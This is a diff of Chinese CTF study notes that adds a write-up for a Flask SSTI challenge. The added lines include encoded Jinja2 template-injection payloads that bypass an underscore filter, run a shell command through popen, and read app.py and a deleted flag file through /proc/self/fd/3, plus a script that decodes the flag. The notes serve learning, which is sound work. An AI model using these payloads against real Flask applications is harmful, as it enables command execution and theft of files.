@@ -15,7 +15,7 @@
 -   ~~[CISCN2019 华东南赛区]Web11 smarty模板注入~~
 -   ~~[BJDCTF2020]The mystery of ip 简单的flask注入~~
 -   ~~[GYCTF2020]FlaskApp debug模式一定条件下可以窃取出来pin码命令执行，但是题目过滤的不够严格导致可以直接打，比签到难一点~~
--   [pasecactf_2019]flask_ssti 编码绕过
+-   ~~[pasecactf_2019]flask_ssti 编码绕过~~
 -   [GWCTF 2019]你的名字
 -   [CISCN2019 总决赛 Day1 Web3]Flask Message Board
 
@@ -265,11 +265,32 @@ decode：
 
 `{{""["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()}}`
 
+读app.py
+
+`{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fmro\x5f\x5f"][1]["\x5f\x5fsubclasses\x5f\x5f"]()[127]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["popen"]("ls")["read"]()}}`
 
 
 
+`{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[91]["get\x5fdata"](0, "app\x2Epy")}}`
+
+解法一：
+
+flag是在config里面
+
+```python
+def encode(line, key, key2):
+    return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))
+
+flag = '-M7\x10wI`7k\x07!5r\x0eF\x0enS(D\x10\x1d\x0c\x17x?\x01c\x02\\@\x0cqW"{A<@\x0f\x19G'
+
+print(encode(flag, 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3',
+      'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT'))
+
+```
+
+解法二：
 
 由于flag最初是存放在文件中，后由app.py读取后删除了该文件，所以可以利用这一点访问/proc/self/fd/，在其中的3即使此前打开的flag文件。
 
-`{ {()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}`
+`{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}`
 
